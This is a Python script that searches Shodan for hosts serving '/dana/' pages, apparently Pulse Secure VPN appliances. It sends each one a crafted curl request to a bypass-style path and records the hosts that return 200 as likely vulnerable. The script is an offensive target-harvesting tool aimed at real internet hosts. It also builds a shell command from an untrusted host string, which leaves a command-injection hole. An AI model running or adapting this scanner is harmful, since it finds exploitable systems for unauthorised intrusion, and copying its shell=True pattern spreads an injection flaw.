from shodan import Shodan
from shodan.cli.helpers import get_api_key
import json
import os
import subprocess

api = Shodan("api_key")
limit = 500
counter = 0
os.system("touch ips")
for banner in api.search_cursor('html:/dana/'):
   # Perform some custom manipulations or stream the results to a database
   # print(banner)
   # with open('data.txt', 'w') as outfile:
   #     json.dump(banner, outfile)

   # f = open('ips','w+')
   # print(banner['http']['host'])
   # os.system("curl -I 'https://" + banner['http']['host'] + "/dana-na///css/ds.js?/dana/html5acc/guacamole/'")
   command = "curl -I -k 'https://" + str(banner['http']['host']) + "/dana-na///css/ds.js?/dana/html5acc/guacamole/'"
   proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
   results = proc.stdout.read().decode("utf-8")
   if '200' in results:
       f = open('ips','a')
       f.write(str(banner['http']['host']) + "\n")
       print(str(banner['http']['host']))
   counter += 1
   if counter >= limit:
       break
